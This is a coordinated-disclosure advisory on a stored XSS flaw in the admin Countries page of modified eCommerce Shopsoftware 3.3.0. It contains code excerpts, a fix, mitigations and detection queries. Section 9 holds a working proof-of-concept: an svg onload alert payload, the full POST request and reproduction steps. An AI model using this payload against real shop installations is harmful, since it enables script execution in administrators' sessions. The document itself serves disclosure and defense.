<div align="center">

# Stored XSS in modified eCommerce Shopsoftware 3.3.0 via `admin/countries.php`

<a href="https://github.com/carlosalbertotuma/RedScan_Research_Team"><img src="https://img.shields.io/badge/RedScan-Research%20Team-B22222?style=for-the-badge" alt="RedScan Research Team"></a>
<img src="https://img.shields.io/badge/CWE--79-Stored%20XSS-orange?style=for-the-badge" alt="CWE-79 Stored XSS">
<img src="https://img.shields.io/badge/Severity-Medium-yellow?style=for-the-badge" alt="Severity Medium">

</div>

Stored Cross-Site Scripting (CWE-79), identified by static analysis and confirmed by dynamic validation, in the administrative Countries page of
[modified eCommerce Shopsoftware](https://github.com/modified-shop/modified-shop) 3.3.0,
via the `countries_name` parameter.

| | |
|---|---|
| **CVE** | {CVE-YYYY-NNNNN} |
| **Vendor** | modified ([modified-shop.org](https://www.modified-shop.org/)) |
| **Product** | modified eCommerce Shopsoftware, open-source PHP e-commerce platform ([modified-shop/modified-shop](https://github.com/modified-shop/modified-shop)) |
| **Affected version** | 3.3.0 (r16825) |
| **Component** | `admin/countries.php`, parameter `countries_name` |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |
| **Suggested severity** | Medium (preliminary CVSS 3.1: 4.8, see section 10) |
| **Status** | Unpatched (still present in the `main` branch as of 2026-11-12); CVE requested via VulDB |
| **Published** | {YYYY-MM-DD} |
| **Last updated** | {YYYY-MM-DD} |

---

## 1. Identification

- **Vendor:** modified ([modified-shop.org](https://www.modified-shop.org/))
- **Product:** modified eCommerce Shopsoftware, open-source PHP e-commerce platform ([modified-shop/modified-shop](https://github.com/modified-shop/modified-shop))
- **Version analyzed:** 3.3.0, revision 16825 (commit `c531afbf7279f6e60ca7cda09f2c9d7ca5305c46`)
- **Endpoint:** `admin/countries.php`
- **Functional parameter:** `countries_name`
- **Vulnerability type:** Stored Cross-Site Scripting (Stored XSS)
- **CWE:** CWE-79 (Primary), CWE-116 (Contributing)
- **Suggested severity:** Medium
- **Analysis method:** Static source code analysis and dynamic validation in a lab environment
- **Dynamic validation:** Performed on 2026-11-10, JavaScript execution confirmed in the browser (section 9)
- **Researcher:** Dom Cabral ([domcabral9](https://github.com/domcabral9)), *RedScan Research Team*

---

## 2. Description

A Stored Cross-Site Scripting (Stored XSS) vulnerability was identified in the country management feature of the administration panel.

The `admin/countries.php` endpoint allows administrators to create and edit countries. The `countries_name` field is received through POST requests and processed by `xtc_db_prepare_input()` before being stored in the `TABLE_COUNTRIES` table.

This function only performs basic input cleanup, such as `trim()` and `stripslashes()`, and does not perform HTML encoding.

The stored value is later retrieved from the database and inserted directly into the HTML at several points of the administration interface, without contextual output encoding.

As a result, an authorized user who creates or edits a country with HTML or JavaScript content causes that content to be interpreted by the browser of any other administrator who views the affected records.

The storefront renders the same value **correctly encoded**, which confirms that the defect is an inconsistent output-encoding problem specific to the administration view.

---

## 3. Technical Evidence

### 3.1. Input handling

In the create flow (`action=insert`), the value is received in:

File: `admin/countries.php`

```php
$sql_data_array = array(
    'countries_name' => xtc_db_prepare_input($_POST['countries_name']),
    'countries_iso_code_2' => xtc_db_prepare_input($_POST['countries_iso_code_2']),
    'countries_iso_code_3' => xtc_db_prepare_input($_POST['countries_iso_code_3']),
    'address_format_id' => xtc_db_prepare_input($_POST['address_format_id']),
    'sort_order' => (int)$_POST['sort_order']
);
```

The same processing happens in the update flow (`action=save`):

```php
$sql_data_array = array(
    'countries_name' => xtc_db_prepare_input($_POST['countries_name']),
    'countries_iso_code_2' => xtc_db_prepare_input($_POST['countries_iso_code_2']),
    'countries_iso_code_3' => xtc_db_prepare_input($_POST['countries_iso_code_3']),
    'address_format_id' => xtc_db_prepare_input($_POST['address_format_id']),
    'sort_order' => (int)$_POST['sort_order']
);
```

`xtc_db_prepare_input()` (`inc/db_functions.inc.php`) only cleans the string:

```php
function xtc_db_prepare_input($string) {
  if (is_string($string)) {
    $string = trim(stripslashes($string));
  } ...
```

### 3.2. Database persistence

The create flow uses:

```php
xtc_db_perform(TABLE_COUNTRIES, $sql_data_array);
```

The update flow uses:

```php
xtc_db_perform(TABLE_COUNTRIES, $sql_data_array, 'update', "countries_id = '".$cID."'");
```

`xtc_db_prepare_input()` does not neutralize HTML or JavaScript content.

Although `xtc_db_perform()` applies the database input protection, that protection targets SQL query construction and does not replace the HTML encoding required when the data is displayed.

### 3.3. Data retrieval

The endpoint retrieves the records through:

```php
$countries_query_raw = "SELECT *
                        FROM ".TABLE_COUNTRIES."
                             ".$where."
                             ".$sort;

$countries_query = xtc_db_query($countries_query_raw);

while ($countries = xtc_db_fetch_array($countries_query)) {
```

The stored values are made available directly in the `$countries` array.

### 3.4. Vulnerable output points

**Point 1: Country list (line 227)**

```php
<td class="dataTableContent">
    <?php echo $countries['countries_name']; ?>
</td>
```

The country name is written directly into the HTML, without output encoding.

**Point 2: Delete confirmation (line 284)**

```php
$contents[] = array(
    'text' => '<br /><b>' . $cInfo->countries_name . '</b>'
);
```

The stored value is concatenated directly into the HTML shown in the delete confirmation.

**Point 3: Details panel title (line 289)**

```php
$heading[] = array(
    'text' => '<b>' . $cInfo->countries_name . '</b>'
);
```

The country name is also used directly in the administration panel title.

**Point 4: Details panel description (line 292)**

```php
$contents[] = array(
    'text' => '<br />' . TEXT_INFO_COUNTRY_NAME . '<br />' . $cInfo->countries_name
);
```

The same value is displayed again without HTML encoding.

The content is then passed to the component:

```php
$box = new box;
echo $box->infoBox($heading, $contents);
```

The `box::infoBox()` implementation (`admin/includes/classes/box.php`) does not automatically encode the values it receives, so it does not neutralize the content inserted at these points.

---

## 4. Other Fields Worth Reviewing

Besides `countries_name`, other persisted values are also displayed without contextual encoding:

| Field | Input | Output identified | Note | Dynamic test |
|---|---|---|---|---|
| `countries_iso_code_2` | POST | Lines 229 and 293 | Expected two-letter format; validation not demonstrated | Truncated to 2 characters by the database column (`<s`); not exploitable on a default install |
| `countries_iso_code_3` | POST | Lines 230 and 294 | Expected three-letter format; validation not demonstrated | Truncated to 3 characters by the database column (`<p`); not exploitable on a default install |
| `address_format_id` | POST | Line 296 | Value received from the form and displayed directly; type and validation need confirmation | Not tested (select field in the UI) |

These are additional candidates for review, but were not classified as confirmed vulnerabilities in this advisory. The `sort_order` field is cast with `(int)` and is not exploitable.

---

## 5. Preconditions and Impact

Exploiting the identified chain requires:

1. Administrative access with permission to create or edit countries (`Zones/Tax → Countries`).
2. Inserting untrusted content into the `countries_name` field.
3. Another administrator viewing the list, the details panel or the delete confirmation of the record.

**Potential impact:**

- JavaScript execution in the context of the administration interface.
- Manipulation of the content displayed to the administrator.
- Actions performed in the interface on behalf of the authenticated user, depending on permissions and existing protections.
- Possible compromise of sessions or data reachable through the interface, depending on the environment's protections.
- Persistence: the payload runs every time the page is loaded, until the record is fixed.

Unauthenticated access or remote exploitation without administrative privileges was not demonstrated. The risk is higher in environments with **multiple back-office users with different trust levels** (e.g., an operator restricted to the Countries module targeting a full administrator).

---

## 6. SQL Injection Analysis

No confirmed SQL Injection chain was identified in the reviewed code:

- `cID` is cast to integer in the update and delete flows.
- `page` is cast to integer.
- The `status` filter is cast to integer.
- The `sorting` parameter uses an allowlist before building the `ORDER BY`.
- Write operations use `xtc_db_perform()`.

The `flag` parameter is received via GET and stored through `xtc_db_perform()`. There is not enough evidence in this file to classify it as SQL Injection.

---

## 7. Recommendation

The fix must be applied at the output points, using contextual HTML encoding for values coming from the database.

Example:

```php
echo htmlspecialchars(
    $countries['countries_name'],
    ENT_QUOTES | ENT_SUBSTITUTE,
    'UTF-8'
);
```

Apply the same protection to the values used in the HTML concatenations of the details panel and the delete confirmation (lines 284, 289 and 292).

The project already ships the `encode_htmlspecialchars()` helper (`inc/html_encoding.php`), used on the storefront. It can be reused as long as it is called with `ENT_QUOTES`, since its default flag is `ENT_COMPAT`.

It is also recommended to:

- Validate `countries_iso_code_2` against the expected two-letter format.
- Validate `countries_iso_code_3` against the expected three-letter format.
- Validate `address_format_id` as a valid numeric identifier.
- Keep the existing SQL protection, without confusing it with XSS protection.
- Review the other administration pages that display persisted data.

Encoding must be applied at output time, according to the context: HTML, attribute, JavaScript or URL.

---

## 8. Conclusion

Static analysis identified a Stored XSS chain in the `countries_name` field of the `admin/countries.php` endpoint.

The value received via POST is persisted in the database and later displayed without HTML encoding at four points of the administration interface.

`xtc_db_prepare_input()` does not neutralize HTML or JavaScript content, and the `box::infoBox()` component does not perform the encoding needed to protect the identified output points.

Dynamic validation (section 9) confirmed JavaScript execution in the administrator's browser when the country list is loaded, and confirmed that the storefront encodes the same value correctly.

**Result:** Stored XSS identified by static analysis and **confirmed by dynamic validation**.

**Suggested classification:** Medium, given that administrative permission to create or modify countries is required.

---

## 9. Dynamic Validation (Proof of Concept)

The PoC only demonstrates script execution with a benign `alert()` and must be used exclusively in authorized environments.

### 9.1. Payload

```html
<svg onload=alert('domcabral9')>
```

### 9.2. Request

```http
POST /admin/countries.php?page=1&cID=248&action=save HTTP/1.1
Host: [REDACTED]
Content-Type: application/x-www-form-urlencoded
Origin: http://[REDACTED]
Referer: http://[REDACTED]/admin/countries.php?page=1&cID=248&action=edit
Cookie: MODsid=[REDACTED]

countries_name=<svg onload=alert('domcabral9')>&countries_iso_code_2=<s&countries_iso_code_3=<p&sort_order=0&address_format_id=1
```

### 9.3. Response

```http
HTTP/1.1 302 Found
Location: http://[REDACTED]/admin/countries.php?page=1&cID=248
```

Loading `admin/countries.php` after the redirect renders the stored value as live HTML and triggers `alert('domcabral9')`.

### 9.4. Evidence

| # | Evidence | File |
|---|---|---|
| 1 | Harmless marker `RS_PROBE_<b>1</b>` submitted in the Name field, with valid values in the other fields (ISO codes `ZZ`/`ZZZ`, sort order `1`) | [`evidence/01-probe-form.jpg`](evidence/01-probe-form.jpg) |
| 2 | Marker `RS_PROBE_<b>1</b>` rendered as bold in the admin list and details panel (HTML interpreted) | [`evidence/02-probe-admin-render.jpg`](evidence/02-probe-admin-render.jpg) |
| 3 | Payload stored in `countries_name`; ISO codes truncated | [`evidence/03-payload-stored.jpg`](evidence/03-payload-stored.jpg) |
| 4 | **JavaScript executed in the administration panel** | [`evidence/04-payload-executed-admin.jpg`](evidence/04-payload-executed-admin.jpg) |
| 5 | Storefront country selector shows the value as plain text | [`evidence/05-storefront-dropdown.png`](evidence/05-storefront-dropdown.png) |
| 6 | Storefront HTML source: value correctly encoded (`&lt;svg ...&gt;`) | [`evidence/06-storefront-escaped-source.jpg`](evidence/06-storefront-escaped-source.jpg) |

> **Note:** the lab host and the session cookie (`MODsid`) were replaced with `[REDACTED]`. Cookies, tokens and credentials were removed from all evidence.

### 9.5. Reproduction steps

1. Install modified eCommerce Shopsoftware **3.3.0** (revision 16825) with default settings.
2. Log in to the administration area with an account that can access **Zones/Tax → Countries**.
3. Open `/admin/countries.php` and click **New Country** (or edit an existing country).
4. Fill in:
   - **Name:** `<svg onload=alert('domcabral9')>`
   - **ISO Code (2):** `ZZ`
   - **ISO Code (3):** `ZZZ`
   - **Sort Order:** `1`
5. Click **Insert** / **Update**.
6. Reload `/admin/countries.php` (or select the country in the list).
7. **Observed:** a JavaScript dialog showing `domcabral9` appears.
8. **Expected (secure behavior):** the name is displayed as literal text, as already happens on the storefront.

### 9.6. PoC limitations

- Does not cause intentional unavailability.
- Does not remove or modify third-party data.
- Does not create persistence or backdoors.
- Contains no real credentials.
- Does not automate mass exploitation.

---

## 10. Classification

- **Suggested severity:** Medium

### CVSS

- **CVSS:** {VECTOR_AND_SCORE to be confirmed}
- **Preliminary estimate:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N` (4.8, Medium). `PR:H` because storing the payload requires an admin session; `UI:R` because another administrator must open the countries page; `S:C` because the impact lands in the victim's browser; `C:L/I:L` reflect reading page content and performing actions as the victim. The final calculation will be confirmed with the RedScan Research Team.

### CWE

- **CWE-79:** Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **CWE-116:** Improper Encoding or Escaping of Output

### CAPEC

- **CAPEC-592:** Stored XSS

---

## 11. Mitigation

Until an official fix is available:

- Restrict access to the Countries module to fully trusted administrators only.
- Review existing country names in the database for HTML tags (see section 12).
- Deploy a Content Security Policy for the administration area that blocks inline scripts and event handlers.
- Monitor changes to the `countries` table.

> Mitigations reduce the risk but do not remove the vulnerability.

---

## 12. Detection and Indicators

- POST requests to `/admin/countries.php` with `countries_name` containing `<`, `>`, `on*=` or `javascript:`.
- Country names in the database containing HTML tags.

### Example query

```sql
SELECT countries_id, countries_name
FROM countries
WHERE countries_name REGEXP '[<>]';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 2026-11-10 | Vulnerability identified by static analysis (RedScan Research Team) |
| 2026-11-10 | Dynamic validation performed in a lab environment |
| 2026-11-12 | Vendor notified by email (info@modified-shop.org, per the vendor security policy) |
| {YYYY-MM-DD} | Vendor acknowledged |
| 2026-11-12 | CVE requested via VulDB (submission #1093810) |
| {YYYY-MM-DD} | Fix released |
| {YYYY-MM-DD} | Advisory published |

---

## 14. Vendor Communication

- **Vendor:** modified ([modified-shop.org](https://www.modified-shop.org/))
- **Product:** modified eCommerce Shopsoftware
- **Channel:** email to info@modified-shop.org, as required by the vendor security policy (https://github.com/modified-shop/modified-shop/security/policy)
- **First notification:** 2026-11-12
- **Response status:** Awaiting response
- **Vendor position:** {SUMMARY}
- **Fixed version:** {FIXED_VERSION}

---

## 15. Credits

<div align="center">

<a href="https://github.com/carlosalbertotuma/RedScan_Research_Team"><img src="https://img.shields.io/badge/RedScan-Research%20Team-B22222?style=for-the-badge" alt="RedScan Research Team"></a>

### *RedScan Research Team*

<sub>Offensive Security · Vulnerability Research · Coordinated Disclosure</sub>

| Role | Member |
|:---:|:---:|
| 🏅 **Lead Researcher** | Carlos Tuma ([bl4dsc4n](https://github.com/carlosalbertotuma)) |
| 🏅 **Lead Researcher** | Smith Braz ([smithbraz](https://github.com/smithbraz)) |
| **Researcher** (dynamic validation and report) | Dom Cabral ([domcabral9](https://github.com/domcabral9)) |

**Honors**

<sub>With honors and deep gratitude to <b>Carlos Tuma</b> and <b>Smith Braz</b>, who lead the RedScan Research Team,<br>for the team's official advisory on which this document is based, for building the lab, mentoring every step of this research<br>and teaching responsible, coordinated disclosure.</sub>

<sub>Contact for corrections, questions or disclosure coordination: <a href="mailto:domcabral@proton.me">domcabral@proton.me</a></sub>

<sub>A research group of students and instructors from <a href="https://www.redscanacademy.com.br/">RedScan Academy</a>.</sub>

</div>

---

## 16. References

- https://github.com/modified-shop/modified-shop
- https://github.com/modified-shop/modified-shop/blob/v3.3.0/admin/countries.php
- https://github.com/modified-shop/modified-shop/releases/tag/v3.3.0
- https://cwe.mitre.org/data/definitions/79.html
- https://cwe.mitre.org/data/definitions/116.html
- https://capec.mitre.org/data/definitions/592.html
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- {CVE_RECORD_URL}
- {NVD_URL}
- https://vuldb.com/submit/1093810 (VulDB submission)
- {VULDB_ENTRY_URL}

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 2026-11-10 | Initial version with dynamic validation |
| 1.1 | 2026-11-10 | Aligned with the official RedScan Research Team advisory (static analysis) |
| 1.2 | 2026-11-11 | Advisory consolidated into this single English README (separate EN and PT-BR files removed) |
| 1.3 | 2026-11-12 | Lab address redacted in evidence 6; evidence 1 replaced by the form submission that produced evidence 2 |
| 1.4 | 2026-11-12 | Preliminary CVSS 3.1 vector added; status updated (unpatched in `main`); VulDB submission referenced; vendor notified by email |
| 1.5 | 2026-11-13 | Vendor (modified) and product (modified eCommerce Shopsoftware) stated separately in the summary, identification and vendor communication sections, matching the VulDB submission; official lowercase spelling of the product name |

---

## 18. Disclaimer

This advisory is published for educational, defensive and security-improvement purposes. The information was obtained in an authorized, isolated lab environment and is disclosed responsibly. The author does not encourage the use of this information for unauthorized access or any illegal activity. Use of this document is the sole responsibility of the reader.
